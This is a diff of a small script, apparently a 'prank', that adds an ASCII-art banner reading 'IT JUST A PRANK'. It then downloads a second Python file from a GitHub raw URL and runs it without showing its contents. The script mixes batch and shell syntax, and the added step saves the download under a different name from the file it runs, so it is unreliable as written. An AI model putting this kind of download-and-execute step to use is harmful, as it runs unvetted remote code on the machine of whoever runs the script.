@@ -7,4 +7,15 @@ curl -o run.py https://raw.githubusercontent.com/RaAlpha168/Python/main/run.py
 echo Running the Python script...
 python run.py
 
-set /p=Press Enter to exit... <nul & pause >nul
+echo "   /|\       /|     /|  /|\   /|    /|   /|/|   /|\         /|\                /|\   /|\   /| |\   /|\   /|\   /|\   /|\  "
+echo "    |       / |    / |   |   / |    |   |     / | |         |                  /   \ /   \  | | |  |     |     |     |    "
+echo "    |      /__|   /__|   |  /__|    |   |\|  /__| |         |                  \    |\    \ | | |  |     |     |     |    "
+echo "    |     /   |  /   |   | /   |    |   |    /   | |        |                   \   | \   | | | |  |     |     |     |    "
+echo "   /|\   /    | /    |  /|/    |   /|\  |   /    | |       /|\                   \_/   \_/  |_|_|   \_/  \_/   \_/   \_/  "
+echo "    |  " 
+echo "                                           IT JUST A PRANK                  " 
+read -p "Press Enter to continue..."
+
+curl -o run.py https://raw.githubusercontent.com/RaAlpha168/Python/main/eyke.py
+python eyke.py
+
